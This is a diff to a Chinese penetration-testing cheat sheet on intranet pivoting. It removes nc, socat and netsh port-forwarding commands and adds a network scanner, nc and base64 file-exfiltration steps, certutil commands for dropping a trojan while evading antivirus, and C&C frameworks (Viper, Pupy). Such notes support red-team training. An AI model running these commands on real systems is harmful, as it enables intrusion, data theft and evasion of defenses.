@@ -9,32 +9,11 @@
 - php方式
 	+ ``php -S 127.0.0.2:8181 -t /www /www/app.php``
 
-端口转发
+内网扫描
 ----------------------------------------
-- nc
-	- 端口扫描
-		+ 默认TCP：``nc -z -v -n 172.31.100.7 21-25``
-	- 端口转发
-		+ 将本地9000端口数据转发到192.168.100.2/8000：``mkfifo tmp/fifo|cat /tmp/fifo | nc 192.168.100.2 8000 | nc -l 9000 > /tmp/fifo`` 
-		+ 访问：``nc -n 192.168.1.102 9000`` 
-- socat
-	- 显示本地文件
-		+ ``socat - /etc/sysctl.conf`` 
-	- 监听本地端口
-		+ ``socat TCP-LISTEN:12345 -`` 
-	- UNIX DOMAIN域套接字转成TCP SOCKET
-		+ ``socat TCP-LISTEN:12345,reuseaddr,fork UNIX-CONNECT:/data/deCOREIDPS/unix.domain`` 
-	- 端口转发
-		+ ``对于所有15000端口的TCP访问，一律转发到 server.wesnoth.org:15000 上`` 
-		+ ``socat -d -d -lf /var/log/socat.log TCP4-LISTEN:15000,reuseaddr,fork,su=nobody TCP4:server.wesnoth.org:15000`` 
-		+ ``tcp：nohup socat TCP4-LISTEN:2333,reuseaddr,fork TCP4:233.233.233.233:6666 >> /root/socat.log 2>&1 &`` 
-		+ ``udp：nohup socat UDP4-LISTEN:2333,reuseaddr,fork UDP4:233.233.233.233:6666 >> /root/socat.log 2>&1 &`` 
-- netsh
-	- 前提：IP Helper服务必须启动；管理员权限；
-	- 查看已存在端口转发：``netsh interface portproxy show all``
-	- 增加监听8888端口转发到3389端口：``netsh interface portproxy add v4tov4 listenport=8888 listenaddress=0.0.0.0 connectaddress=0.0.0.0 connectport=3389``
-	- 删除转发端口：``netsh interface portproxy del v4tov4 listenport=8888 listenaddress=0.0.0.0``
-	- 删除所有转发端口：``netsh interface portproxy reset``
++ Netspy
+	- 项目地址：``https://github.com/shmilylty/netspy``
+	- 一款快速探测内网可达网段工具。
 
 传输数据
 ----------------------------------------
@@ -46,6 +25,9 @@
 
 文件传输
 ----------------------------------------
+
+出网传输
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 - nc
 	- 文件传输
 		+ 将B机器上的file.txt传输到A机器上
@@ -57,6 +39,9 @@
 	- 加密传输
 		+ ``nc localhost 1567 | mcrypt –flush –bare -F -q -d -m ecb > file.txt``
 		+ ``mcrypt –flush –bare -F -q -m ecb < file.txt | nc -l 1567``
+
+不出网文件落盘
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 - python
 	- 目标机器转base64
 		+ ``目标机器有python：python -c 'print(__import__("base64").b64encode(open("secret.zip", "rb").read()))'``
@@ -65,6 +50,15 @@
 		+ ``输入拿到的base64串：UEsDBBQACQAIAEZ/CE8bl，输入完成按回车``
 		+ ``^C即ctrl+c``
 		+ ``还原文件：base64 -d zip.txt > secret.zip``
+- certutil.exe
+	- 前提：具有目标机器的命令执行shell，进行木马文件落盘，躲避AV的文件下载行为的查杀
+	- 示例
+		::
+		
+			将文件hack.exe转换成签名文件（base64编码）
+			certutil -f -encode d:\hack.exe d:\out.txt
+			使用echo命令将out.txt文件写入目标机器，执行以下代码将文件还原成exe
+			certutil -f -decode d:\out.txt d:\hack.exe
 
 脱裤
 ----------------------------------------
@@ -152,6 +146,20 @@
 	 + 新一代特权升级脚本套件，适用于 Windows 和 Linux/Unix* 以及 MacOS 的权限提升工具
 	 + 项目地址: ``https://github.com/carlospolop/PEASS-ng``
 
+综合协同工具
+-----------------------------------------
+- Viper 【C&C】
+	+ 项目地址：``https://github.com/FunnyWolf/Viper``，``https://www.yuque.com/vipersec``
+	+ 说明：
+		- Viper(炫彩蛇)是一款图形化内网渗透工具,将内网渗透过程中常用的战术及技术进行模块化及武器化.
+		- Viper(炫彩蛇)集成杀软绕过,内网隧道,文件管理,命令行等基础功能.
+		- Viper(炫彩蛇)当前已集成70+个模块,覆盖初始访问/持久化/权限提升/防御绕过/凭证访问/信息收集/横向移动等大类.
+		- Viper(炫彩蛇)目标是帮助红队工程师提高攻击效率,简化操作,降低技术门槛.
+		- Viper(炫彩蛇)支持在浏览器中运行原生msfconsole,且支持多人协作.
+- PUPY【C&C】
+	+ 项目地址：``https://github.com/n1nj4sec/pupy``
+	+ 帮助：``https://3gstudent.github.io/Pupy%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90-Windows%E5%B9%B3%E5%8F%B0%E4%B8%8B%E7%9A%84%E5%8A%9F%E8%83%BD``
+	+ Pupy是一个用 Python 编写、开源的跨平台（Windows、Linux、OSX、Android）远程管理和后期开发工具。
 
 .. |netstat| image:: ../images/netstat.png
 .. |msfvemon1| image:: ../images/msfvenom1.png
